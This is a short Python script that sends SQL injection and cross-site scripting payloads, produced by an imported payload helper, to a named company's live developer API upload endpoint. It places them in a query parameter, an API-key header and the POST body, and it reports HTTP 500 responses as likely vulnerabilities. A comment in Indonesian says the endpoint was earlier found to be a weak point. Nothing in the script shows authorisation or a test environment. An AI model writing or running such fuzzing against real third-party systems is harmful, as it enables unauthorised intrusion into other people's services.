
import httpx
import asyncio
import sys
import os

# Add parent directory
sys.path.append(os.getcwd())
from tools.payload_tools import generate_sqli_payloads, generate_xss_payloads

async def auto_fuzz():
    target_url = "https://developers.oppomobile.com/api/utility/upload" # Titik lemah terdeteksi sebelumnya
    payloads = generate_sqli_payloads(5) + generate_xss_payloads(5)
    
    print(f"Starting auto-fuzzing on {target_url}...")
    
    async with httpx.AsyncClient(timeout=10.0) as client:
        for p in payloads:
            print(f"Testing payload: {p}")
            try:
                # Test in parameters
                res = await client.get(target_url, params={"q": p})
                # Test in headers
                res2 = await client.post(target_url, headers={"X-API-Key": p}, data={"data": p})
                
                if res.status_code == 500 or res2.status_code == 500:
                    print(f"[!!!] POTENTIAL VULNERABILITY FOUND with payload: {p}")
            except:
                pass

if __name__ == "__main__":
    asyncio.run(auto_fuzz())
